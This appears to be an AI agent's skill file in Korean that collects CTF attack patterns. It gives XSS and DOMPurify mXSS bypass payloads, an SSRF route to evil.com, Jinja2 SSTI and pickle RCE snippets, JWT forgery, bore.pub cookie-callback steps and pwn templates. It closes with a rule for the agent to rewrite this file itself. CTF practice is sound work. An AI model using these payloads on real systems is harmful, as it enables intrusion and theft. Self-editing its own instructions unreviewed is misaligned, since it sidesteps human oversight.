---
name: ctf-personal
description: >
  명종의 CTF 풀이 경험 기반 코드 템플릿과 공격 패턴 모음.
  카테고리별 ctf-* 스킬과 함께 로드되며, 범용 스킬에 없는
  개인 경험 패턴(bore.pub 콜백, ETag leak, nginx RCE 등)과
  자주 쓰는 코드 스니펫을 제공한다.
---

# 개인 CTF 코드 템플릿 & 패턴

---

## Web 패턴

### XSS + Bot 챌린지
1. XSS 페이로드 → 봇 방문 유도
2. document.cookie 또는 내부 fetch → bore.pub 콜백
3. CMS(WordPress 등) → 플러그인 업로드 CSRF 체이닝

**cloudflared 콜백 서버 사용 시 주의:**
```python
# 터널 URL 획득 후 바로 exploit 제출하면 0 hits (라우팅 미안정)
# 반드시 ~8초 대기
time.sleep(8)
```

### Unquoted Attribute XSS — 공백 금지 규칙

`onerror=PAYLOAD//>`처럼 unquoted attribute에 payload 넣을 때, **공백(space/tab/LF)이 속성값을 종료**시킨다.
`"`, `'`, `=`, `<`, `` ` ``는 parse error이지만 값에 추가됨. `>`는 태그 종료.

```html
<!-- 실패: return 뒤 공백에서 onerror 값이 잘림 -->
<img onerror=fetch('/buy').then(function(r){return r.json();})>

<!-- 성공: /**/ 로 공백 대체 (HTML 파서는 문자로 추가, JS는 whitespace로 처리) -->
<img onerror=fetch('/buy').then(function(r){return/**/r.json();})>
```

payload 작성 체크리스트:
- 공백 없음 (JS 전체 스캔)
- `>` 없음 (태그 조기 종료)
- `"` 없음 (quote context 파괴)
- 불가피한 공백 → `/**/` 대체

### mXSS (Mutation XSS)

sanitizer 통과 후 브라우저 DOM 삽입 시 XSS 발생. sanitizer 파서(예: JSDOM)와 브라우저 파서(Chrome)의 해석 차이가 원인.

**DOMPurify 2.0.8 + JSDOM 16.3.0 bypass 벡터:**
```html
<math><mtext><table><mglyph><style><!--</style><img src=x title="--><img src=x onerror=PAYLOAD>">
```

원리:
- JSDOM: `<style>` in MathML = raw text → `<!--`을 CSS 주석으로 처리 → 전체를 안전한 `<img title="...">` 하나로 sanitize 통과
- Chrome 86: `<style>` in mglyph = foreign element (raw text 아님) → `<!--`을 HTML 주석으로 처리 → `-->`까지 주석 처리 → 이후 `<img onerror=PAYLOAD>`가 실제 태그로 파싱 → XSS 발화

조건:
- DOMPurify ≤ 2.0.8 (`mglyph`이 ALLOWED_TAGS에 포함)
- Node.js 서버사이드에서 JSDOM 기반으로 DOMPurify 실행
- 실제 렌더링: Chrome 계열 브라우저의 innerHTML

버전 확인: JS 번들에서 `@license DOMPurify` 주석 검색  
패치 버전: DOMPurify 2.1.0+ (`mglyph` ALLOWED_TAGS 제거)

### SSRF + DNS Rebinding
1. 내부망 타겟 확인 (127.x, 10.x, 169.254.x.x)
2. rbndr.us DNS rebinding 설정
3. bore.pub 콜백 수신 (VPS 불필요)
4. 리다이렉트 루프 우회 (HTTPS-only, 빈 응답 주의)

### SSRF via axios isAbsoluteURL + Vue Router

axios의 `isAbsoluteURL` 정규식: `/^([a-z][a-z\d\+\-\.]*:)?\/\//i`  
scheme이 **optional**이라 `///hostname/path`도 absolute URL로 인식 → baseURL 무시 → 브라우저가 protocol-relative로 처리 → `http://hostname/path` 외부 요청 발생.

Vue Router SPA에서 `%2F` 인코딩으로 trigger 가능:
```
report URL: /#/%2F%2Fevil.com%2Fitem/detail
  → Vue Router params.id = "//evil.com/item"
  → axios.get("/" + "//evil.com/item" + "/info") = "///evil.com/item/info"
  → isAbsoluteURL("///evil.com/item/info") = true
  → 브라우저: http://evil.com/item/info 요청 (SSRF)
```

서버 측 `//` 포함 체크도 우회됨 (`%2F%2F`는 리터럴 `//` 아님).

### SSTI
```python
# Jinja2 기본 확인
{{7*7}}  # → 49
# RCE
{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}
# 필터 우회: attr(), |join 등
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')}}
```

### JWT
- alg:none → 서명 제거 후 페이로드 조작
- RS256→HS256 키 혼동: 공개키로 HS256 서명
- kid injection: `"kid": "../../dev/null"` → 빈 키
```python
import jwt
token = jwt.encode({"role":"admin"}, "", algorithm="none")
```

### 역직렬화
```python
# Python pickle RCE
import pickle, os
class Exploit:
    def __reduce__(self):
        return (os.system, ('cat /flag',))
payload = pickle.dumps(Exploit())
```

### GraphQL
- Introspection으로 스키마 덤프
- 클라이언트 사이드 이스케이프 결함 우선 탐색
- 관리자 권한 mutation 탐색

### nginx ingress RCE
- CVE-2025-24514 + CVE-2025-1974 체이닝
- auth-url 인젝션 페이로드: `}}}` 블록 탈출

### ETag Length Leak (PortSwigger Top 10 2025)
- Cross-origin 길이 오라클 → 바이너리 서치
- false positive 방지: 두 번 confirm (`!c1 || !c2`)
- Promise.all 병렬화 시 타이밍 주의

### CI/CD SSRF
- 내부 메타데이터 엔드포인트 탐색
- bore.pub + DNS rebinding 조합

---

## Pwn 패턴

### Buffer Overflow
```python
from pwn import *
e = ELF('./binary')
r = remote('host', port)
offset = cyclic_find(0x6161616b)
payload = b'A' * offset + p64(win_addr)
r.sendline(payload)
r.interactive()
```

### ROP Chain
- PIE 꺼진 경우: ROPgadget / ropper로 가젯 탐색
- libc leak → system("/bin/sh") 체이닝
- `ret` 가젯으로 stack alignment 맞추기 (64bit)

### libc 식별
```python
# leak된 주소로 libc 버전 식별
# libc.rip 또는 libc.blukat.me 에서 검색
# 또는 docker_exec에서: python3 -c "from pwnlib.libcdb import *; print(search_by_symbol_offsets({'puts': 0xXXXXX}))"
```

### Format String
```python
# FSB 읽기: %7$p → 7번째 인자 출력
# FSB 쓰기:
payload = fmtstr_payload(6, {got_addr: system_addr})
```

### Heap Exploitation
- UAF → tcache poisoning → __malloc_hook 덮어쓰기
- double free → 청크 재사용
- 청크 크기별 bin 확인 (fastbin/tcache/unsorted)

### Seccomp Bypass
- seccomp-tools dump로 허용 syscall 목록 확인
- ORW (open/read/write) 체인으로 flag 읽기

---

## Crypto 패턴

### RSA
```python
from Crypto.Util.number import *
# 작은 e (e=3): iroot(c, 3)
# n 소인수분해: factordb.com / sympy.factorint
# Wiener's attack: e가 매우 크고 d가 작을 때
# Common modulus: gcd(e1,e2)=1 → 확장 유클리드
# Hastad's broadcast: 같은 m을 여러 n,e로 암호화 → CRT
```

### GF(256) Sage API 함정

최신 Sage에서 GF(256) 원소 변환 시 구 API가 없는 경우 있음:

```python
# 구 API (일부 Sage 버전에서 AttributeError)
F.fetch_int(n)              # → AttributeError
e.integer_representation()  # → AttributeError

# 대체 API
F.from_integer(int(n))      # 정수 → GF(256) 원소
def to_int(e):              # GF(256) 원소 → 정수
    poly = e.polynomial()
    coeffs = poly.coefficients(sparse=False)
    result = 0
    for i, c in enumerate(coeffs):
        if c == GF(2)(1): result |= (1 << i)
    return result
```

### Oil-and-Vinegar(UOV) 서명 위조 — Kipnis-Shamir 공격

공개키 m개의 n×n 행렬 P_k over GF(256)만으로 서명 위조:

```
핵심 흐름:
1. S_k = P_k + P_k^T (대칭화)
2. M = A⁻¹B (A,B = S_k의 랜덤 선형결합)
3. char_poly(M) 인수분해 → 1차 인수 (x-λ) 탐색 (약 50% 확률/시도)
4. 2-dim 고유공간 span{v1,v2}에서 α∈GF(256) 256회 탐색 → oil 벡터 w
5. W = ker{(S_k·w)^T·x=0} (dim=32, 드물게 33)
6. 32×W_dim 시스템 풀기, W_dim=33이면 null space 보정 (α∈GF(256) 256회 반복)
7. sig = v_rand + o, 검증 후 전송

주의: char_poly(M) = p(x)² 항상 성립 (A,B 대칭 → M^T=BA⁻¹, W와 W^⊥이 같은 char_poly)
      → 커널 분리 불가 → 1차 인수가 유일한 진입점
```

전체 코드: ctf-crypto/advanced-math.md "Oil-and-Vinegar" 섹션 참조.

### AES
- ECB mode: 블록 경계 활용, chosen plaintext
- CBC mode: IV 조작, padding oracle
- CTR mode: 키스트림 재사용 → XOR

### 고전 암호
- Caesar: 26가지 brute force
- Vigenere: Index of Coincidence로 키 길이 추정
- XOR: 반복 키 → 키 길이 추정 후 frequency analysis

### 해시
1. hash_crack MCP로 자동 식별 + rockyou 크랙
2. 실패 시 hashcat rule 기반 변형 시도
3. Length extension attack (MD5/SHA1/SHA256)

---

## Reverse 패턴

### 주요 기법
- 안티디버깅: ptrace 체크 NOP 패치
- VM 난독화: 가상 명령어 세트 역분석
- Python 바이트코드: uncompyle6 / pycdc
- .NET: dnSpy로 디컴파일
- Android APK: jadx로 Java 소스 복원
- WASM: wasm2wat으로 텍스트 변환
- Go: 심볼 스트리핑 → GoReSym으로 복원
- Rust: 거대 바이너리, 패닉 문자열에서 함수 이름 힌트

### Z3 플래그 역산
```python
from z3 import *
s = Solver()
flag = [BitVec(f'c{i}', 8) for i in range(length)]
s.add(...)
if s.check() == sat:
    m = s.model()
    print(''.join(chr(m[c].as_long()) for c in flag))
```

---

## Misc 패턴

### Pyjail / Bash Jail
- `__builtins__` 복원: `().__class__.__bases__[0].__subclasses__()`
- 문자 제한 우회: `chr()` 조합, exec/eval 체인
- bash 제한: `/???/??t /???/p?s?w?` 글로빙

### 스테가노그래피
- 이미지: LSB (stegsolve), zsteg, steghide
- 오디오: Audacity 스펙트로그램, SSTV
- 파일: binwalk 추출, foremost

---

## Forensics 패턴

### 네트워크 캡처
- Wireshark: Follow TCP/HTTP stream
- TLS 복호화: 키로그 파일 활용
- USB HID: hidtool / USB-Mouse-Pcap-Visualizer

---

## OSINT 패턴

### Google Dorking
- `site:target.com filetype:pdf`
- `inurl:admin`, `intitle:"index of"`

### 이미지 OSINT
- exiftool → GPS 좌표 → Google Maps
- 역이미지: Google Images, TinEye, Yandex

---

## Web3 패턴

### Solidity 취약점
- reentrancy: checks-effects-interactions 위반
- integer overflow: SafeMath 미사용 (0.8 이전)
- tx.origin 인증: msg.sender로 우회
- selfdestruct: 강제 이더 전송

### 공격 도구
```python
from web3 import Web3
w3 = Web3(Web3.HTTPProvider('http://...'))
contract = w3.eth.contract(address=addr, abi=abi)
tx = contract.functions.attack().build_transaction({...})
```

---

## 플랫폼별 참고

### 일반 CTF
- 플래그 포맷: `FLAG{...}` 또는 `[대회명]{...}`
- CTFd 플랫폼: `/api/v1/challenges`로 문제 목록 조회 가능

---

## 자동 학습 규칙
풀이 완료 후 아래 조건을 만족하면 이 파일(~/.agents/skills/ctf-personal/SKILL.md)을 직접 수정한다:
- 기존 패턴 섹션에 없는 새 기법이 사용된 경우
- 기존 패턴의 변형/우회가 발견된 경우
- 새 CVE 또는 플랫폼 특이사항이 확인된 경우

수정 형식:
1. 해당 카테고리 섹션에 패턴 추가
2. 패턴명, 핵심 원리, 간단한 코드/페이로드 예시 포함
3. 기존 내용은 절대 삭제하지 않음
